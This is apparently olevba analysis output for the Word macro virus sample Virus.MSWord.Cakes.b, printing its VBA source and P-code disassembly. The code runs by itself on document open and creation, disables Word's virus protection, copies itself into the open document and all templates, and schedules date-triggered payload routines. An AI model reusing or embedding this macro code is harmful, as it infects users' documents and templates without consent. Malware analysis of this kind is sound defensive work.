olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cakes.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cakes.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO L_.bas 
in file: Virus.MSWord.Cakes.b - OLE stream: 'Macros/VBA/L_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'V1.1
'4/10/97
'MJRN-MF-TA
Const Refresh = "00:50:00"
Const Boom = "28/3/"
Sub AutoNew()
        Options.VirusProtection = False
        On Error Resume Next
        
        Dim f As Integer
        f = FreeFile
        Dim c As Integer
        Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
        c = Rnd * 1000
        Write #f, c
        Close f
        
        Application.OrganizerCopy _
            Source:=ThisDocument.FullName, _
            Destination:=ActiveDocument.FullName, _
            Name:="L_", _
            Object:=wdOrganizerObjectProjectItems
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
            Source:=d.FullName, _
            Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoOpen()
        Options.VirusProtection = False
        On Error Resume Next
        Dim f As Integer
        f = FreeFile
        Dim c As Integer
        Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
        c = Rnd * 1000
        Write #f, c
        Close f
        
        If (ThisDocument.FullName <> ActiveDocument.FullName) Then
            Application.OrganizerDelete _
                Source:=ActiveDocument.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=ActiveDocument.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            ActiveDocument.Save
        End If
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
                Source:=d.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoExec()
        Options.VirusProtection = False
        On Error Resume Next
        
        Dim f As Integer
        f = FreeFile
        Dim c As Integer
        Open "C:\WINDOWS\MAJORANA.E" For Append Access Read Write As f Len = Len(c)
        c = Rnd * 1000
        Write #f, c
        Close f
        
        Dim v As Date
        v = DateValue(Boom & Year(Now))
        If (Date >= v) And (Date <= v + 2) Then
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto"
        Else
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
        End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cakes.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/L_ - 4224 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0004 "V1.1"
' Line #1:
' 	QuoteRem 0x0000 0x0007 "4/10/97"
' Line #2:
' 	QuoteRem 0x0000 0x000A "MJRN-MF-TA"
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0008 "00:50:00"
' 	VarDefn Refresh
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0005 "28/3/"
' 	VarDefn Boom
' Line #5:
' 	FuncDefn (Sub AutoNew())
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #10:
' 	Ld Friend 
' 	St False 
' Line #11:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #12:
' 	LitStr 0x0015 "C:\WINDOWS\MAJORANA.E"
' 	Ld False 
' 	Ld c 
' 	FnLen 
' 	Open (For Append Access Read Write)
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	St c 
' Line #14:
' 	Ld False 
' 	Sharp 
' 	WriteChan 
' 	Ld c 
' 	PrintItemNL 
' Line #15:
' 	Ld False 
' 	Close 0x0001 
' Line #16:
' Line #17:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #18:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #19:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld d 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #20:
' 	LineCont 0x0008 03 00 0C 00 09 00 0C 00
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #21:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	Ld d 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub AutoOpen())
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #30:
' 	Ld Friend 
' 	St False 
' Line #31:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #32:
' 	LitStr 0x0015 "C:\WINDOWS\MAJORANA.E"
' 	Ld False 
' 	Ld c 
' 	FnLen 
' 	Open (For Append Access Read Write)
' Line #33:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	St c 
' Line #34:
' 	Ld False 
' 	Sharp 
' 	WriteChan 
' 	Ld c 
' 	PrintItemNL 
' Line #35:
' 	Ld False 
' 	Close 0x0001 
' Line #36:
' Line #37:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #38:
' 	LineCont 0x0008 03 00 10 00 09 00 10 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #39:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #43:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld d 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #44:
' 	LineCont 0x0008 03 00 10 00 09 00 10 00
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #45:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	Ld d 
' 	ArgsMemCall Save 0x0000 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub AutoExec())
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' Line #54:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #55:
' 	Ld Friend 
' 	St False 
' Line #56:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #57:
' 	LitStr 0x0015 "C:\WINDOWS\MAJORANA.E"
' 	Ld False 
' 	Ld c 
' 	FnLen 
' 	Open (For Append Access Read Write)
' Line #58:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	St c 
' Line #59:
' 	Ld False 
' 	Sharp 
' 	WriteChan 
' 	Ld c 
' 	PrintItemNL 
' Line #60:
' 	Ld False 
' 	Close 0x0001 
' Line #61:
' Line #62:
' 	Dim 
' 	VarDefn v (As Date)
' Line #63:
' 	Ld Boom 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	ArgsLd DateValue 0x0001 
' 	St v 
' Line #64:
' 	Ld Date 
' 	Ld v 
' 	Ge 
' 	Paren 
' 	Ld Date 
' 	Ld v 
' 	LitDI2 0x0002 
' 	Add 
' 	Le 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #65:
' 	Ld Now 
' 	Ld Refresh 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000A "L_.effetto"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	Ld Now 
' 	Ld Refresh 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000B "L_.effetto2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

